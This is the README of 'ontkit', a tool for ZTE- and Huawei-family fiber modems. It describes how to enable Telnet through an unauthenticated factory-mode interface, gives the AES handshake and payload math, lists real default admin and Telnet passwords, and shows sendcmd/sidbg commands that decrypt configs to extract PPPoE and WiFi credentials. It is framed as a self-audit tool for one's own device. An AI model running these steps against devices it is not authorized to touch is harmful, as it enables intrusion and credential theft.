# ontkit

多厂商光猫（ONT）安全自查工具：识别固件家族 → 开启 Telnet → 读取配置 → 提取凭据。

## 型号对照

| 型号 | 厂商 | 固件家族 | 默认端口 | 主要入口 | 状态 |
|---|---|---|---|---|---|
| 九联 UNG853H | 九联（移动定制） | ZTE 系 | 80 | `.gch` + `lastgood.xml` | 推断，待真机验证 |
| 吉比特 H3-2 | 吉比特 | ZTE 系 | 80 | `.gch` + `sendcmd` | 推断，待真机验证 |
| 中兴 ZXHN G7615 | 中兴 | ZTE 系 | 8080 | `webFac` 工厂模式 | 协议已按公开实现移植 |
| 华为 HS8145X6 | 华为 | 华为 ssmp | 80 | Web 登录 → 开 Telnet | 实验性 |
| 华为 B866-L1 | 华为 | 华为 ssmp | 80 | 同上 | 实验性 |

> 判断依据：UNG853H 的超级密码社区方法围绕 `lastgood.xml` 展开，`sidbg`/`sendcmd`/`webFac` 是中兴方案的标志性组件；G7615 直接命中 zteOnu 的支持列表；HS8145X6 / B866-L1 为华为 ssmp 体系，登录与 Telnet 机制与中兴完全不同，因此单列一套引擎。

> **验证状态说明**
> 本仓库**没有任何一台真机可用于验证**。`zte_factory` 的协议来自公开实现（zteOnu），
> 其中 SendInfo payload 的数学已用自测用例验证；其余流程（webFac 握手、.gch 登录、
> 华为 ssmp）**均未在真机上跑通**。请把输出当作调试信息，而不是保证可用的功能。

## 快速开始

```bash
# 1) 先识别
python3 -m ontkit probe -H 192.168.1.1

# 2) 中兴系：开 Telnet + 提凭据
python3 -m ontkit zte -H 192.168.1.1 -p 8080 --mode factory --enable-telnet

# 3) 华为系
python3 -m ontkit huawei -H 192.168.1.1
```

按型号直接跑（入口脚本会自动补默认端口）：

```bash
python3 models/ung853h.py  -H 192.168.1.1 -u user -P '背面贴纸密码' --extract
python3 models/h3_2.py     -H 192.168.1.1 -u user -P '背面贴纸密码' --extract
python3 models/g7615.py    -H 192.168.1.1 --mode factory --enable-telnet
python3 models/hs8145x6.py -H 192.168.1.1
python3 models/b866l1.py   -H 192.168.1.1
```

## 中兴系原理

### 1. webFac 工厂模式

设备在 `http://<ip>:8080` 暴露一个未鉴权的 `webFac` 接口，流程为：

```
POST webFac      SendSq.gch                 复位，返回 400 表示就绪
POST webFac      RequestFactoryMode.gch     申请进入工厂模式
POST webFac      SendSq.gch?rand=<当前秒>    握手，返回版本与随机数
POST webFacEntry AES(CheckLoginAuth.gch?user=telecomadmin&pass=nE7jA%5m)
POST webFacEntry AES(FactoryMode.gch?mode=2) 返回 telnet 账号密码
```

- 密钥由 96 字节密钥池按 `rand`（及 `newrand`）切片后异或 `0xA5` 得到 24 字节
- 通信体为 **AES-ECB + 零填充**
- 版本 2 的设备还要求先发 `SendInfo.gch`，其 payload 把本机 MAC 编码成 46 字节

### 2. SendInfo 的数学

设备侧校验：把 payload 每 4 字节读成小端整数 `w`，计算 `w^1271 mod 2537`，取低 8 位；每 6 个结果与客户端 MAC 比对。

因此本工具反解：对每个 MAC 字节找 `v` 使 `(v^1271 mod 2537) & 0xff` 等于它，填入 payload。`magic_bytes()` 生成后可用 `verify_payload()` 自测（已在本地验证通过）。

### 3. 配置读取

```bash
sendcmd 1 DB set TelnetCfg 0 Lan_Enable 1
sendcmd 1 DB set TelnetCfg 0 TSLan_UName root
sendcmd 1 DB set TelnetCfg 0 TSLan_UPwd  Zte521
sendcmd 1 DB set TelnetCfg 0 Max_Con_Num 3
sendcmd 1 DB set TelnetCfg 0 InitSecLvl 3
sendcmd 1 DB save
sidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml
```

解出的明文配置包含 `DevAuthInfo`（Web 账号）、`TelnetUser`、`WANCPPP`（PPPoE）、`WLANPSK`（WiFi 密钥）。

## 华为系原理（实验性）

- 默认超管：电信 `telecomadmin/nE7jA%5m`，移动 `CMCCAdmin/aDm8H%MdA`
- Telnet：`root/adminHW`，进入后常需 `su`
- 开启入口各固件不同，工具会依次尝试 `/onttelnet.cgi`、`/enableTelnet.cgi` 等，失败则提示在 Web「安全 → 设备访问控制」手动开启

华为的 `su` 密码由设备序列号推导，各版本算法不一，本工具**未内置**该算法，避免给出不可靠结果。

## 已知限制

- 除 G7615 的 webFac 协议外，其余型号均**未经真机验证**，请把运行日志反馈后再迭代
- 光猫升级固件后接口路径可能变化
- 部分运营商固件把 webFac 关闭，此时工厂模式不可用
- 华为系目前只能做「登录 + 尝试开启 Telnet」，不保证成功

## 免责声明

仅限对你**自有设备**进行维护与自查。未经授权访问他人设备违反法律。

## 安全提醒

- 华为/中兴的 Web 登录都有失败计数（通常 3 次），本工具已把尝试上限设为 3 次并在达到后停止
- 若设备已因多次失败进入延时校验，请静默等待 10~30 分钟再试，不要继续重试
- 首次在真机上运行时建议加 `--mode web` 只做只读探测，确认流程后再开启 `--enable-telnet`
